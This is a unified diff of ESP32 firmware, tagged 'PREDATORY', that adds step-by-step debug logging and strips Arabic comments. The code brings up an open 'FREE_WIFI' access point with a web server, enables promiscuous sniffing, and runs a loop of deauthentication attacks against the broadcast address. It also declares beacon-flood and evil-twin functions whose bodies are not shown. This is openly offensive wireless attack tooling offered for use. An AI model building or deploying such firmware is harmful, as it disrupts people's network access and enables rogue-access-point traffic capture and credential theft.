@@ -10,7 +10,6 @@
 
 static const char *TAG = "PREDATORY";
 
-// دوال الهجمات
 void deauth_attack(uint8_t *bssid);
 void beacon_flood(char *ssid);
 void start_sniffing(void);
@@ -18,15 +17,8 @@ void evil_twin_start(char *target_ssid);
 void rickroll_start(void);
 void start_web_server(void);
 
-// دوال معالجة الأوامر
-void handle_deauth(void);
-void handle_beacon(void);
-void handle_sniff(void);
-void handle_evil_twin(void);
-void handle_rickroll(void);
-
-// مهمة الهجمات الرئيسية
 void attack_loop(void *pv) {
+    ESP_LOGI(TAG, "Attack loop started!");
     while(1) {
         uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         deauth_attack(bssid);
@@ -35,8 +27,8 @@ void attack_loop(void *pv) {
     }
 }
 
-// تشغيل نقطة الوصول
 void start_ap(void) {
+    ESP_LOGI(TAG, "Step 1: Configuring AP...");
     wifi_config_t ap_config = {
         .ap = {
             .ssid = "FREE_WIFI",
@@ -48,53 +40,63 @@ void start_ap(void) {
         },
     };
     
-    ESP_LOGI(TAG, "Starting AP...");
+    ESP_LOGI(TAG, "Step 2: Setting mode to AP...");
     esp_wifi_set_mode(WIFI_MODE_AP);
+    
+    ESP_LOGI(TAG, "Step 3: Setting config...");
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    
+    ESP_LOGI(TAG, "Step 4: Starting WiFi...");
     esp_wifi_start();
+    
     ESP_LOGI(TAG, "AP Started: FREE_WIFI");
 }
 
 void app_main(void) {
-    ESP_LOGI(TAG, "App starting...");
+    ESP_LOGI(TAG, "=== APP STARTING ===");
     
-    // تهيئة NVS مع مسح تلقائي عند التلف
+    ESP_LOGI(TAG, "Step 1: Initializing NVS...");
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
-        ESP_LOGI(TAG, "Erasing NVS...");
+        ESP_LOGI(TAG, "NVS error, erasing...");
         ESP_ERROR_CHECK(nvs_flash_erase());
         ret = nvs_flash_init();
     }
     ESP_ERROR_CHECK(ret);
+    ESP_LOGI(TAG, "NVS OK");
     
-    // تهيئة الشبكة
-    ESP_LOGI(TAG, "Initializing network...");
+    ESP_LOGI(TAG, "Step 2: Initializing netif...");
     ESP_ERROR_CHECK(esp_netif_init());
-    ESP_ERROR_CHECK(esp_event_loop_create_default());
+    ESP_LOGI(TAG, "netif OK");
     
-    // تهيئة WiFi مع تحسينات
-    ESP_LOGI(TAG, "Initializing WiFi...");
+    ESP_LOGI(TAG, "Step 3: Creating event loop...");
+    ESP_ERROR_CHECK(esp_event_loop_create_default());
+    ESP_LOGI(TAG, "event loop OK");
+    
+    ESP_LOGI(TAG, "Step 4: Initializing WiFi...");
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_LOGI(TAG, "WiFi OK");
     
-    // تشغيل AP
+    ESP_LOGI(TAG, "Step 5: Starting AP...");
     start_ap();
+    ESP_LOGI(TAG, "AP started");
     
-    // تشغيل خادم الويب
-    ESP_LOGI(TAG, "Starting web server...");
+    ESP_LOGI(TAG, "Step 6: Starting web server...");
     start_web_server();
+    ESP_LOGI(TAG, "Web server started");
     
-    // تأخير للتأكد من استقرار الشبكة
+    ESP_LOGI(TAG, "Step 7: Waiting 2 seconds...");
     vTaskDelay(2000 / portTICK_PERIOD_MS);
     
-    // تفعيل وضع التنصت مع تحسينات
-    ESP_LOGI(TAG, "Enabling promiscuous mode...");
+    ESP_LOGI(TAG, "Step 8: Enabling promiscuous mode...");
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
+    ESP_LOGI(TAG, "Promiscuous mode enabled");
     
-    // تشغيل الهجمات
-    ESP_LOGI(TAG, "Starting attacks...");
+    ESP_LOGI(TAG, "Step 9: Starting attack loop...");
     xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
     
-    ESP_LOGI(TAG, "System ready! Connect to FREE_WIFI and visit 192.168.4.1");
+    ESP_LOGI(TAG, "=== SYSTEM READY ===");
+    ESP_LOGI(TAG, "Connect to FREE_WIFI and visit 192.168.4.1");
 }
